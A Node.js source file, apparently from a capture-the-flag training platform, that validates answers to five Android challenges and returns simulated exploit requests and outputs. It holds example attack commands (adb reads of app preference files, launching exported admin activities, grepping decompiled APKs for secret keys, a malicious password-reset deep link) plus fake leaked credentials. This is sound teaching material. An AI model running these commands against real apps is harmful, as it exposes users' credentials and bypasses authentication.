const { getFlag } = require("../../utils/flags");
const { validateAndroid } = require("../../utils/validators");

function submitAndroid(level, payload) {
  const id = Number(level);
  const isCorrect = validateAndroid(id, payload);

  // Realistic request simulation
  const requests = {
    1: `adb shell
cd /data/data/com.khansploit.app/shared_prefs/
cat user_data.xml`,
    2: `adb shell am start -n com.khansploit.app/.AdminActivity
# or
adb shell content query --uri content://com.khansploit.provider/users`,
    3: `# Traffic intercepted
GET http://api.khansploit.lab/v1/user HTTP/1.1
Host: api.khansploit.lab`,
    4: `# APK decompiled with jadx / apktool
grep -r "AIza\\|sk_live\\|api_key\\|secret" .`,
    5: `adb shell am start -a android.intent.action.VIEW \\
  -d "khansploit://reset?user=admin&token=evil"`,
  };

  const successResponses = {
    1: `<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
  <string name="password">SuperSecret123</string>
  <string name="api_key">sk_live_abc123xyz</string>
  <string name="token">eyJhbGciOiJIUzI1NiIs...</string>
</map>`,
    2: `Starting: Intent { cmp=com.khansploit.app/.AdminActivity }
Status: ok

Admin panel loaded successfully.
Sensitive user data accessible.`,
    3: `HTTP/1.1 200 OK
Content-Type: application/json

{
  "username": "admin",
  "password": "CleartextPass123",
  "session": "abc123"
}

Cleartext traffic successfully intercepted.`,
    4: `Found in strings.xml / MainActivity.smali:

API_KEY = "AIzaSyD-HardcodedKey123456789"
SECRET  = "sk_live_51HqXYZ..."
JWT_SECRET = "super_jwt_secret_key"

Hardcoded secrets extracted.`,
    5: `Deep link handled:
Scheme: khansploit
Host: reset
Params: user=admin&token=evil

Password reset triggered for admin without authentication.`,
  };

  const failResponses = {
    1: "Permission denied or file not found",
    2: "Error: Activity not found or permission denied",
    3: "Connection refused or certificate error",
    4: "No secrets found with current pattern",
    5: "No Activity found to handle Intent",
  };

  if (!isCorrect) {
    return {
      success: false,
      message: "Payload did not solve the challenge.",
      request: requests[id] || `Payload: ${payload}`,
      response: failResponses[id] || "Access denied",
    };
  }

  const flag = getFlag("mobile", "android", id);

  return {
    success: true,
    message: "Challenge solved successfully!",
    flag,
    request: requests[id] || `Payload: ${payload}`,
    response: successResponses[id] || "Vulnerability successfully exploited",
  };
}

module.exports = { submitAndroid };